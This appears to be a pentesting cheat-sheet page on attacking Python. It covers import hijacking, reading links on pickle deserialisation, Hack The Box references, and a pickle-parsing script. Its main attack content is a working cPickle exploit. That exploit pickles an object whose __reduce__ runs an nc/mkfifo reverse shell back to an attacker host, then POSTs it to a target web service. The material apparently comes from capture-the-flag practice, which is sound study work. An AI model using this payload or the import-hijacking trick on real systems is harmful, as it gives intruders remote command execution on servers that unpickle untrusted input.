# Python

## Challenges

- <https://www.hackingnote.com/en/python-challenge-solutions/level-5>

## Exploiting Imports

It is possible to create a `.py` file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library.

## cPickle RCE

- [Arbitrary code execution with Python pickles](https://checkoway.net/musings/pickle/)
- [Python Pickle Injection](http://xhyumiracle.com/python-pickle-injection/)
- <https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/>
- <https://blog.nelhage.com/2011/03/exploiting-pickle/>
- <https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module>
- HTB - DevOps
- HTB - Challenge - Mics - Long Bottom's Locker

## Process pickle file

> - <https://www.hackingnote.com/en/python-challenge-solutions/level-5>

```python
#!/usr/bin/python3
import sys
import pickle

f = open(sys.argv[1], 'rb')
mydict = pickle.load(f)
f.close

for line in mydict:
    print("".join([k * v for k, v in line]))

for i in mydict:
    b=[]
    for x in i:
        #print x
        b.append(x[0] * x[1])

    print("".join(b))
```


```python
import cPickle, requests, base64

LHOST = '10.10.14.14'
LPORT = '31337'
RHOST = '10.10.10.91'
RPORT = '5000'


class Payload(object):
	def __init__(self, cmd):
		self.cmd = cmd
	def __reduce__(self):
		import os
		return (os.system, (self.cmd,))


reverse_sh = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (LHOST, LPORT)
evilpickle = cPickle.dumps(Payload(reverse_sh))

r = requests.post('http://%s:%s/newpost' % (RHOST, RPORT), data=base64.urlsafe_b64encode(evilpickle))
print('POST {} {}'.format(r.status_code, r.url))
```